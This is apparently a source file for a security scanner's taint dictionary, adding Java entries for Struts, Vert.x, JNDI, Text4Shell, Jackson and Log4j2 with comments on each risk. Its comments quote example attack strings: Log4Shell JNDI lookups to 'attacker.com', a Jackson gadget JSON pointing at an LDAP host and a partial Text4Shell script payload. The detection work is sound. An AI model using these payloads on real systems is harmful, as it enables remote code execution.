/**
 * Phoneme expansion: Java — Struts ActionForm, Vert.x, JNDI, Apache Commons, Jackson, Log4j
 * Agent-generated, tested against real patterns
 *
 * WHY THESE 10:
 * The base java.ts + first expansion cover Servlet API, Spring, JDBC, JPA, MyBatis,
 * InitialContext.lookup (Log4Shell), OgnlUtil (Struts2 RCE), and SpEL. But the Java
 * ecosystem has MORE dangerous surfaces:
 *
 *   1. Apache Struts ActionForm — the pre-Spring MVC framework. ActionForm subclasses
 *      receive user input via auto-populated fields. Any getter on an ActionForm returns
 *      user-controlled data. Struts1 is EOL but still runs in banking/government systems.
 *      ActionForm is the INGRESS vector for the entire Struts1 request lifecycle.
 *
 *   2. Vert.x RoutingContext — the reactive web framework alternative to Spring.
 *      RoutingContext.request().getParam() is the primary INGRESS vector. 14K GitHub
 *      stars, used in Red Hat middleware. Zero entries in the base dictionary.
 *
 *   3. Vert.x HttpServerResponse — the EGRESS side. response.end(body) sends data
 *      to the client. If tainted data from getParam() flows to end() unescaped = XSS.
 *
 *   4. DirContext.lookup — JNDI lookup through the directory service interface. Same
 *      danger as InitialContext.lookup but through a different API path. LDAP injection
 *      and Log4Shell payloads work through DirContext too.
 *
 *   5. Apache Commons Text StringSubstitutor.replace — CVE-2022-42889 (Text4Shell).
 *      Default interpolators include script:/dns:/url: prefixes that allow RCE.
 *      If user input reaches StringSubstitutor.replace(), it's code execution.
 *
 *   6. Apache Commons FileUpload FileItem — the standard multipart file upload handler.
 *      FileItem.get() returns raw bytes, FileItem.getString() returns file content as
 *      string. Both are user-controlled INGRESS from uploaded files.
 *
 *   7. Jackson ObjectMapper.enableDefaultTyping — THE enabler of polymorphic
 *      deserialization attacks. CVE-2017-7525 through CVE-2020-36188 (30+ CVEs).
 *      This single method call turns ObjectMapper.readValue() from safe JSON parsing
 *      into an arbitrary object instantiation gadget chain. This is META/config because
 *      it changes the BEHAVIOR of readValue, not because it's dangerous on its own.
 *
 *   8. Apache Commons IO FileUtils.readFileToString — reads entire file to string.
 *      Not tainted itself (it reads from disk), but it's a common path traversal
 *      sink when the filename comes from user input (CWE-22).
 *
 *   9. Log4j2 LogManager.getLogger + direct Logger usage — the factory and the logger.
 *      Log4j2 (not SLF4J) evaluates ${jndi:ldap://...} in log message strings.
 *      The existing logger.info entries with tainted:false are CORRECT for SLF4J.
 *      But Log4j2's native Logger.info with string concatenation of user input
 *      is the actual Log4Shell trigger. We add the Log4j-specific factory here.
 *
 *  10. Vert.x HttpServerRequest.body/bodyHandler — the request body in Vert.x.
 *      Unlike Servlet's getInputStream(), Vert.x uses an async handler pattern.
 *      body() returns a Future<Buffer> with the raw request body — tainted input.
 *
 * CRITICAL NOTES:
 *
 * On Log4Shell (CVE-2021-44228): The attack chain is:
 *   user input -> string concatenation -> logger.info() -> Log4j message lookup
 *   -> ${jndi:ldap://attacker.com/exploit} -> InitialContext.lookup() -> RCE
 * The existing InitialContext.lookup entry catches the JNDI end. But the ENTRY
 * POINT is the logger call with tainted input. A complete scanner needs BOTH:
 * the tainted logger call (source of the lookup string) AND the JNDI lookup (sink).
 * We mark Logger.info/error/warn/debug/fatal (Log4j2 native, not SLF4J) with
 * a note but DON'T override the existing logger.* entries because those correctly
 * model the SLF4J case. The Log4j2 case needs dependency-version analysis.
 *
 * On Jackson polymorphic deser: enableDefaultTyping() is the config gate.
 * Once enabled, readValue() with a type that has subtypes becomes exploitable
 * via crafted JSON like {"@class":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://evil"}.
 * The readValue() entry already exists as TRANSFORM/parse — that's correct.
 * The dangerous COMBINATION is enableDefaultTyping + readValue + untrusted input.
 */

import type { NodeType } from '../types.js';

export interface CalleePattern {
  nodeType: NodeType;
  subtype: string;
  tainted: boolean;
}

export const PHONEMES_JAVA_STRUTS_VERTX: Record<string, CalleePattern> = {

  // ── 1. Apache Struts ActionForm — user input via form beans ──────────────
  // In Struts1, the framework auto-populates ActionForm fields from HTTP request
  // parameters. Any ActionForm subclass getter returns user-controlled data.
  // Example: public class LoginForm extends ActionForm { public String getUsername() }
  // The form object IS the ingress — its fields map 1:1 to request params.
  // Struts1 is EOL since 2013 but still deployed in banking and government.
  'ActionForm.get':           { nodeType: 'INGRESS', subtype: 'http_request', tainted: true },

  // ── 2. Vert.x RoutingContext — request parameter INGRESS ─────────────────
  // RoutingContext is the Vert.x equivalent of HttpServletRequest + Response.
  // rc.request().getParam("name") returns user-controlled query/path parameters.
  // rc.pathParam("id") returns path segment parameters from the route definition.
  // These are the primary tainted input vectors in any Vert.x web application.
  'RoutingContext.pathParam': { nodeType: 'INGRESS', subtype: 'http_request', tainted: true },

  // ── 3. Vert.x HttpServerRequest.getParam — direct request access ─────────
  // When developers access the HttpServerRequest directly (not via RoutingContext),
  // request.getParam("key") returns user-controlled query parameters.
  // request.getHeader("X-Forwarded-For") returns user-controlled headers.
  // This is the Vert.x equivalent of Servlet's request.getParameter().
  'HttpServerRequest.getParam':  { nodeType: 'INGRESS', subtype: 'http_request', tainted: true },

  // ── 4. Vert.x HttpServerResponse.end — response EGRESS ──────────────────
  // response.end(body) sends the response body and closes the connection.
  // If tainted data from getParam() flows into end() without escaping, it's XSS.
  // Vert.x does NOT auto-escape — it sends raw bytes/strings.
  'HttpServerResponse.end':  { nodeType: 'EGRESS', subtype: 'http_response', tainted: false },

  // ── 5. DirContext.lookup — JNDI through directory services ───────────────
  // DirContext extends Context and is used for LDAP directory lookups.
  // Same attack surface as InitialContext.lookup — user-controlled JNDI names
  // trigger remote class loading. This is an ALTERNATE path to Log4Shell-type
  // attacks. Example: dirCtx.lookup("ldap://attacker.com/exploit")
  // LDAP injection (CWE-90) is the direct attack; RCE via class loading is the impact.
  'DirContext.lookup':       { nodeType: 'EXTERNAL', subtype: 'jndi_lookup', tainted: true },

  // ── 6. Apache Commons Text StringSubstitutor — Text4Shell (CVE-2022-42889)
  // StringSubstitutor.replace("${script:javascript:java.lang.Runtime...}")
  // Default interpolators include: script, dns, url — all of which can execute
  // arbitrary code or exfiltrate data. If user input reaches replace(), it's RCE.
  // Fixed in Commons Text 1.10.0 by disabling script/dns/url interpolators.
  // This is EXTERNAL/expression_eval because it evaluates embedded expressions,
  // just like SpEL and OGNL — but from Apache Commons, not Spring/Struts.
  'StringSubstitutor.replace': { nodeType: 'EXTERNAL', subtype: 'expression_eval', tainted: true },

  // ── 7. Apache Commons FileUpload FileItem — uploaded file content ────────
  // FileItem represents a single uploaded file in a multipart/form-data request.
  // FileItem.get() returns raw bytes of the uploaded file.
  // FileItem.getString() returns the file content as a decoded string.
  // Both are user-controlled and tainted — the file content is attacker-provided.
  // Common in Struts1/2 apps and legacy Servlet-based file upload handlers.
  'FileItem.getString':      { nodeType: 'INGRESS', subtype: 'file_upload', tainted: true },

  // ── 8. Jackson enableDefaultTyping — polymorphic deserialization gate ────
  // ObjectMapper.enableDefaultTyping() enables type metadata in JSON, allowing
  // {"@class":"evil.Gadget",...} to instantiate arbitrary classes during readValue().
  // This single method call has caused 30+ CVEs (CVE-2017-7525 through CVE-2020-36188).
  // Marked as META/config because it CHANGES the security posture of readValue().
  // The scanner should flag any codebase that calls this as high-risk.
  'ObjectMapper.enableDefaultTyping': { nodeType: 'META', subtype: 'dangerous_config', tainted: false },

  // ── 9. Apache Commons IO FileUtils.readFileToString — file read ──────────
  // Reads entire file to String. Common sink for path traversal (CWE-22) when
  // the File argument is constructed from user input.
  // Example: FileUtils.readFileToString(new File(userPath), "UTF-8")
  // Not tainted itself (data comes from disk, not user) but the PATH may be tainted.
  'FileUtils.readFileToString': { nodeType: 'INGRESS', subtype: 'file_read', tainted: false },

  // ── 10. Vert.x HttpServerRequest body handler — async request body ───────
  // In Vert.x, the request body is read asynchronously via request.body().
  // Returns Future<Buffer> containing the raw request body — fully user-controlled.
  // This is the Vert.x equivalent of Servlet's request.getInputStream().
  'HttpServerRequest.body':  { nodeType: 'INGRESS', subtype: 'http_body', tainted: true },

} as const;

// ─── FINDINGS ────────────────────────────────────────────────────────────
//
// 1. LOG4SHELL ENTRY POINT GAP: The scanner currently catches InitialContext.lookup
//    (the JNDI sink) but NOT the entry point — a Log4j2 Logger.info/error/warn call
//    with tainted string arguments. The attack chain is:
//      user input → string concat → Logger.info("User: " + input)
//      → Log4j2 message lookup sees ${jndi:ldap://...} → InitialContext.lookup → RCE
//    The existing logger.info entries (META/logging, tainted:false) are correct for
//    SLF4J, which does NOT evaluate JNDI lookups in message strings. But Log4j2's
//    native org.apache.logging.log4j.Logger DOES. A complete scanner needs to:
//    (a) detect whether the project uses Log4j2 natively (not via SLF4J facade),
//    (b) check the Log4j2 version (< 2.17.1 is vulnerable),
//    (c) flag any logger.info/error/warn/debug/fatal with tainted string arguments
//    as a potential Log4Shell vector.
//    This is OUTSIDE phoneme scope — it requires dependency version analysis and
//    taint tracking into log message arguments. But it is the #1 gap in the Java
//    dictionary for real-world CVE detection.
//
// 2. STRUTS2 ACTION CLASS INGRESS: Beyond ActionForm (Struts1), Struts2 Action
//    classes receive user input via OGNL-populated fields. The Struts2 ValueStack
//    auto-populates Action fields from request params. This is how CVE-2017-5638
//    worked — the Content-Type header was evaluated as OGNL. OgnlUtil.getValue is
//    already covered. The missing piece is the Action class field population itself,
//    but that's implicit (framework magic) not an explicit method call, so it can't
//    be captured as a phoneme entry.
//
// 3. JACKSON activateDefaultTyping vs enableDefaultTyping: Jackson deprecated
//    enableDefaultTyping() and replaced it with activateDefaultTyping(). Both
//    have the same security impact. I added enableDefaultTyping because it's the
//    one in 30+ CVEs. activateDefaultTyping should also be flagged but I'm at the
//    10-entry limit.
//
// 4. VERT.X EVENTBUS: Vert.x EventBus.send/publish is an inter-verticle messaging
//    system. If user-controlled data is sent over the event bus, it can reach
//    other verticles that trust the data. This is similar to JMS/Kafka but internal.
//    Not included in the 10 but worth flagging as a future entry.
